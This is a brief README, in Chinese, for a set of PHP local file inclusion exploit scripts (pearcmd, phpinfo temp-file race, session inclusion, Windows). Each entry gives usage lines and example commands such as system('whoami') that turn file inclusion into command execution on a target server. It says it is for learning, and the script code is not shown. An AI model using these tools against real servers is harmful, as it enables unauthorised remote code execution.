# LFI EXP TOTAL

- 根据[首页 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/)编写
- 默认参数为file ，写的一般，仅供学习

## pearcmd_exp.py
```shell
use as：
	python3 pearcmd_exp.py ip port path command
example: 
    python -u ".\pearcmd_exp.py" 127.0.0.1 80 lfi.php file.php "ls /"
```

## phpinfo_tmp_lfi_offical.py

```shell
use as:
	python2 phpinfo_tmp_lfi_offical.py ip port pool
example:
	python2 phpinfo_tmp_lfi_offical.py 127.0.0.1 80 150
```

## session_lfi.exp.py

```shell
use as:
	python3 session_lfi.exp.py url command
example:
	example python -u ".\session_lfi.exp.py" "http://test.com/lfi.php" "system('ls');"
```

## window_lfi_exp.py

```shell
use as:
	python3 window_lfi_exp.py url php_eval
example:
	python window_lfi_exp.py  http://127.0.0.1/ "system('whoami')"             
```



